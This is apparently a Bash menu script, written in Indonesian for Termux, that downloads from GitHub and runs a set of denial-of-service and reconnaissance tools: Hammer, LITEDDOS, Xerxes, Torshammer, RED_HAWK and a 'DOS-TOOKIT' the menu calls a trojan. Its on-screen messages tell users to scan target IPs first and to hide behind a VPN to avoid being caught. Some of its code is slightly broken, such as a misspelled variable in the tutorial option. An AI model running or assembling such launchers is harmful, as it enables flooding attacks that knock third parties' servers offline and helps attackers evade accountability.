#!/bin/bash
#buat sendiri goblok
#jangan recode tools orang asw

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
sleep 2
echo $yellow
cat njay.txt
sleep 4
echo ""
echo "\033[32;1m[$]\033[34;1m====================>\033[35;1m[$]"
echo "\033[34;1mAuthor : Mr.51MB4H"
echo "\033[35;1mTeam : INDENPENDENT CYBER TEAM"
echo "\033[31;1mHANYA SEORANG NOOB!!!"
echo "\033[34;1m[$]\033[36;1m====================>\033[35;1m[$]"
echo ""
sleep 5
figlet "ATTACK" | lolcat

echo "\033[36;1mSilahkan Pilih Toolsnya"
echo "\033[35;1m"
sleep 5
echo "\033[33;1mSaran W IP nya scan pakai RED_HAWK DULU:)"
sleep 4
echo "\033[36;1mSEMANGAT YA JANGAN LUPA PAKAI VPN BIAR GAK KECIDUK:)"
sleep 3
echo $green"BILA BINGUNG LIHAT TUTORIALNYA DULU"
echo $red "TUTORIAL NO 7"
echo "[-------------------------------"
echo $green "1]>RED_HAWK(cek ip) "
echo "[--------------------------------------]>"
echo $blue "2]> HAMMER"
echo "[----------------------------------------)>"
echo $yellow "3]>LITEDDOS"
echo "[--------------------------------------!>"
echo $cyan "4]>XERXES"
echo "[••••••••••••••••••••••••••••••••••••••}"
echo $green "5]>Torshammer"
echo "[••••••••••••••••••••••••••••••••••••••]>"
echo $white "6]>DOS-TOOKIT(trojan)"
echo "[•••••••••••••••••••••••••••••••••••••]>"
echo $blue "7]>TUTORIAL"
echo "]=======================================]>"
echo $cyan "0]>out"
echo "[•••••••••••••••••••••••••••••••••••••]>"
echo $yellow "════•ೋೋ•════╗"​
      read -p " PILIH NO    ╙>" say

sleep 2
if [ $say  = 1 ]|| [ $say = 01 ]
then
clear
figlet "MR.51MB4H" | lolcat
pkg install update
pkg install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
pkg install php
php rhawk.php
fi

if [ $say  = 2 ]|| [ $say = 02 ]
then
clear
toilet "HAMMER"
pkg install update
pkg install upgrade
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
python3 hammer.py
fi


if [ $say = 3 ] || [ $say = 03 ]
then
clear
toilet "MR.51MBAH"
apt install update
apt install upgrade
pkg install git
pkg install python2
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
python2 LITEDDOS.py
fi

if [ $say = 4 ] || [ $say = 04 ]
then
clear
figlet "XERXES" | lolcat
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
echo $green "KHUSUS XERXES JALANIN SENDIRI"
echo $cyan "BILA BINGUNG ADA KOK TUTORIALNYA"
echo $blue "SANTAI SAJA BRAY"
fi

if [ $say = 5 ] || [ $say = 05 ]
then
clear
figlet "MR.51MB4H"  | lolcat
pkg update
pkg install git
apt install tor
pkg install python2
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
python2 torshammer.py
fi

if [ $say = 6 ] || [ $say = 06 ]
then
clear
toilet "MR.51MB4H" | lolcat
pkg install git
pkg install python3
pkg install bash
git clone https://github.com/BPCATTACKER/DOS-TOOKITS
mv DOS-TOOKITS $HOME
cd $HOME/DOS-TOOKITS
sh DoS-TOOKIT.sh
fi

if [ $say = 7 ] || [ $sat = 07]
then
clear
figlet "TUTORIAL"
echo $blue "PELAJARI DULU"
sh TR.sh
fi



if [ $say = 0 ] || [ $say = 00 ]
then
clear
figlet "EXIT" | lolcat
echo $blue "semua hanya sementara..."
sleep 1
echo $yellow "sampai jumpa lagi"
sleep 1
echo $cyan "Thanks udah gunakan tools ini"
sleep 1
echo "\033[32;1mINDENPENDENT CYBER TEAM WAS HERE"
sleep 1
exit
fi
